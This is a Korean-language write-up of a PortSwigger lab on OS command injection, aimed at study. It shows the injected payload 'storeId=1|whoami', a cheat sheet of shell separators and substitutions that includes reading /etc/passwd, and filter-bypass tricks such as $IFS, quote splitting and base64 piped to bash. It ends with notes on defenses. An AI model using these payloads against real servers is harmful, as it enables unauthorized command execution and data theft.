# Lab: OS command injection, simple case

## 개요

- **난이도**: Apprentice
- **주제**: OS Command Injection — 즉시 출력 / 쉘 메타문자
- **링크**: https://portswigger.net/web-security/os-command-injection/lab-simple

## 목표

재고 확인 기능의 `storeId` 파라미터에 OS 명령을 주입해 `whoami` 결과를 응답에서 확인한다.

## 취약 지점

```
POST /product/stock HTTP/1.1

productId=1&storeId=1
              ↑
       셸 명령에 직접 포함되는 파라미터
```

서버 내부 처리 (추정):
```python
output = os.popen(f"check_stock {productId} {storeId}").read()
```

## 공격 페이로드

```
storeId=1|whoami
```

서버에서 실행되는 명령:
```bash
check_stock 1 1|whoami
#                ↑
#         | 로 앞 명령 출력을 whoami 입력으로 전달
#         실제로는 whoami 결과만 응답에 반환됨
```

응답:
```
peter-gBxxxx
```

## 쉘 메타문자 (Shell Metacharacters)

OS Command Injection 에서 사용 가능한 명령 구분자와 특수문자:

### 명령 연결 / 구분자

```bash
# ; — 순차 실행 (앞 명령 성공/실패 무관)
1; whoami
→ check_stock 1; whoami    # whoami 항상 실행

# && — 앞 명령 성공 시에만 실행
1 && whoami
→ check_stock 1 && whoami  # check_stock 성공 시 whoami 실행

# || — 앞 명령 실패 시에만 실행
1 || whoami
→ check_stock 1 || whoami  # check_stock 실패 시 whoami 실행

# | — 파이프 (앞 명령 출력 → 다음 명령 입력)
1 | whoami
→ check_stock 1 | whoami   # whoami 에 출력 전달 (결과는 whoami)

# 개행 (%0a) — 명령 구분
1%0awhoami
→ check_stock 1
  whoami                    # 줄바꿈으로 구분
```

### 명령 치환 (Command Substitution)

```bash
# 백틱 — 명령 실행 후 결과를 문자열로 치환
`whoami`
echo `whoami`  → echo peter

# $() — 백틱과 동일, 중첩 가능
$(whoami)
echo $(whoami) → echo peter
echo $(cat /etc/passwd)
```

### 리다이렉션

```bash
# > — 출력을 파일로 저장 (덮어쓰기)
whoami > /tmp/out
cat /tmp/out

# >> — 출력을 파일에 추가
whoami >> /tmp/out

# < — 파일 내용을 입력으로 사용
cat < /etc/passwd
```

### 공백 우회 (필터 우회 시)

```bash
# 공백 대체
{whoami,}          # bash brace expansion
$IFS               # Internal Field Separator (공백 역할)
whoami$IFS-a

# 탭 (%09)
1%09whoami

# 개행 (%0a)
1%0awhoami
```

### 필터 우회 기법

```bash
# 따옴표 삽입 (문자열 연결)
who''ami           → whoami
w'h'o'a'm'i       → whoami
"w"h"o"a"m"i      → whoami

# 변수 치환
a=who;b=ami;$a$b  → whoami

# Base64 인코딩
echo d2hvYW1p | base64 -d | bash   → whoami 실행
```

### OS 별 차이

```
[Linux / macOS]
  구분자: ; && || | \n `cmd` $(cmd)
  경로:   /etc/passwd, /bin/bash, /tmp/

[Windows]
  구분자: & && || | \n
  명령:   whoami, dir, type
  경로:   C:\Windows\System32\
  파이프: dir | findstr admin

[공통 주의]
  URL 인코딩 필요 시:
    ;  → %3b
    &  → %26
    |  → %7c
    \n → %0a
    공백 → %20 또는 +
```

## 취약점 유형별 정리

```
[즉시 출력 (이번 랩)]
  명령 실행 결과가 응답에 바로 반환
  → 어떤 구분자든 실행 결과 확인 가능

[Blind — 출력 없음]
  응답에 결과 없음
  탐지: sleep 10 으로 시간 지연 확인
  추출:
    출력 리다이렉션 → 웹 접근 가능 경로에 저장
    OOB → curl/nslookup 으로 외부 전송

[취약한 파라미터 위치]
  URL 파라미터, POST body, HTTP 헤더 (User-Agent, Referer, X-Custom)
  쿠키, JSON/XML 필드
```

## 방어

```
[근본 해결]
  사용자 입력을 OS 명령에 포함시키지 않음
  → 동일 기능을 언어 내장 API 로 구현

[불가피하게 사용 시]
  화이트리스트 검증: 숫자/알파벳만 허용
    if not re.match(r'^[0-9]+$', storeId):
        raise ValueError

  입력 이스케이프:
    Python: shlex.quote(user_input)
    Ruby:   Shellwords.escape(user_input)

[절대 피해야 할 것]
  블랙리스트 방식 (;, |, & 차단) → 우회 가능
  단순 strip() → 앞뒤 공백만 제거, 의미 없음
```

## 핵심 정리

- `storeId` 에 `|whoami` 를 삽입하면 서버에서 `whoami` 가 실행되고 결과가 응답에 반환된다.
- 쉘 메타문자(`;`, `&&`, `||`, `|`, `\n`, 백틱, `$()`)를 이용해 명령을 이어붙일 수 있다.
- 필터가 있을 경우 공백 우회(`$IFS`, `%09`), 따옴표 삽입, 변수 치환 등의 기법으로 우회 가능하다.
- 근본적인 방어는 OS 명령 사용 자체를 피하거나, `shlex.quote()` 같은 안전한 이스케이프를 적용하는 것이다.
